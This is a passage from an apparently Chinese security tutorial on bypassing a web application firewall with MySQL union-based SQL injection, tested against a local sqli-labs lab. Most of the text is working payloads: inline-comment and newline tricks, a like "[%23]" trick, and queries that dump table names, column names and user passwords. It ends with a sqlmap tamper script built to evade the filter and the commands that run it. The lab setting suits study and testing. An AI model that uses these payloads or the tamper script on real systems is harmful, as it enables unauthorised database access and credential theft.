正常的话语句一般是这个样子
    group_concat(table_name) from information_schema.tables where table_schema=database()
那么这里的话我们测试过后就会发现information_schema被过滤了，它俩只要在一起挨着就会被过滤  
同时呢，我们也发现利用from的时候也会被过滤  
对这两个进行分别fuzz的话比较麻烦，而且将两者进行一起用时可能会出现仍然被过滤的情况，因此此时的话就自然的想到了内联注释这种方法，可不可以用这种方法来进行绕过呢，我们先尝试一下
    from/*!information_schema.tables*/
结果如下  
显然这种是不可行的，但是我们知道还有一种的话就是内联注释的利用方法就是中间加注释符再加换行，也就是`/*!%23%0a*/`这种形式，我们先进行本地测试
    mysql> select /*!#
        -> 1*/;
    +---+
    | 1 |
    +---+
    | 1 |
    +---+
    1 row in set (0.00 sec)
    mysql> select /*!#/*
        -> 1*/
        -> ;
    +---+
    | 1 |
    +---+
    | 1 |
    +---+
    1 row in set (0.00 sec)
此时经过本地测试发现，当运用内联注释时，里面插入/*，来构造`/**/`，也是可以实现绕过的，此时我们先试本地测试的第一种方法
    ?id=-1' union/*/!*!**/select%201,2,group_concat(table_name)from/*!%23%0ainformation_schema.tables*/ where table_schema='security'--+
此时被绕过，那我们就用刚刚测试出来的第二种方法进行尝试
    ?id=-1' union/*/!*!**/select%201,2,group_concat(table_name)from/*!%23/*%0ainformation_schema.tables*/ where table_schema='security'--+
此时想有没有可能是过滤了%23,我们将%23换成`--+`  
构造payload如下
    ?id=-1' union/*/!*!**/select%201,2,group_concat(table_name)from/*!--+/*%0ainformation_schema.tables*/ where table_schema='security'--+
得到了全部表
# 爆列
有了表名的注入，那么注入列名也不是件太难的事情，修改一下语句即可，构造payload如下
    ?id=-1' union/*/!*!**/select%201,2,group_concat(column_name)from/*!--+/*%0ainformation_schema.columns*/ where table_name='users'--+
# 爆字段信息
同理，修改语句即可
    ?id=-1' union/*/!*!**/select%201,2,group_concat(id,password)from/*!--+/*%0ausers*/--+
# 其他姿势
## like["%23"]
在学习其他师傅的文章时，偶然间发现这个`like["%23"]`，这个的话我们知道%23是注释符的含义，那么在这里的时候，它这个语句到底有什么作用呢，我们测试一下就知道了  
首先先正常查一个字段信息
    select * from users where id=1 ;
此时可以发现有一个结果，我们加上我们的`like["%23"]`，构造payload如下
    select * from users where id=1 like "[%23]";
此时表变成空的了，那我们如果此时这样构造payload
    select * from users where id=1 like "[%23]" union select * from users;
我们知道前面`users where id=1 like "[%23]"`这个是空，那它这条语句就相当于
    select * from users
如下图所示  
那么此时我们就可以去我们的靶场进行测试，看是否能绕过
    id=-1' like "[%23]" /*!10440union select*/ 1,2,3 --+
发现没有绕过，此时我们将union后的空格用换行符替代
    id=-1' like "[%23]" /*!10440union%0aselect*/ 1,2,3 --+
此时就可以注入了，因此新的姿势就出现了，其他具体的不再列举，这里给出payload
    //爆库
    id=-1' like "[%23]" /*!10440union%0aselect*/ 1,2,database/*!--+/*%0a()*/ --+
    //爆表
    id=-1' like "[%23]" /*!10440union%0aselect*/ 1,2,group_concat(table_name)from/*!--+/*%0ainformation_schema.tables */where table_schema='security'--+
    //爆列
    id=-1' like "[%23]" /*!10440union%0aselect*/ 1,2,group_concat(column_name)from/*!--+/*%0ainformation_schema.columns */where table_name='users'--+
    //爆字段
    id=-1' like "[%23]" /*!10440union%0aselect*/ 1,2,group_concat(id,username,password)from/*!--+/*%0ausers*/--+
# tamper脚本
脚本如下
    #!/usr/bin/env python
    """
    Copyright (c) 2006-2022 sqlmap developers (https://sqlmap.org/)
    See the file 'LICENSE' for copying permission
    Author:quan9i.top
    """
    import re #导入re模块
    import os #导入os模块
    from lib.core.data import kb #导入sqlmap中lib\core\data中的kb函数,测试SQL注入的过程中,使用的配置文件事先全部被加载到了conf和kb
    from lib.core.enums import PRIORITY  #导入sqlmap中lib\core\enums中的PRIORITY函数，LOWEST = -100,LOWER = -50,LOW = -10,NORMAL = 0,HIGH = 10,HIGHER = 50,HIGHEST = 100
    from lib.core.common import singleTimeWarnMessage#输出到sqlmap控制台的函数
    from lib.core.enums import DBMS#一个数据库的枚举
    __priority__ = PRIORITY.LOW#定义优先级为LOW
    def dependencies():
        singleTimeWarnMessage("Bypass safedog by pureqh'%s' only %s" % (os.path.basename(__file__).split(".")[0], DBMS.MYSQL))# singleTimeWarnMessage() 用于在控制台中打印出警告信息
    def tamper(payload, **kwargs):
        payload=payload.replace('AND','/*!10000AND*/')
        payload=payload.replace('OR','/*!10000OR*/')
        payload=payload.replace('ORDER BY','ORDER/*////*/BY')
        payload=payload.replace('()','/*!20553()*/')
        payload=payload.replace('UNION SELECT','UNION/*/!*!**/SELECT')
        payload=payload.replace('information_schema.tables','/*!%23%0ainformation_schema.tables*/')
        return payload
示例如下
    //检测可注入类型
    python sqlmap.py -u http://127.0.0.1:81/sqli-labs-master/Less-1/?id=1 --tamper=dog
破解数据库
    python sqlmap.py -u http://127.0.0.1:81/sqli-labs-master/Less-1/?id=1 --dbs --tamper=dog -v5
# 参考文献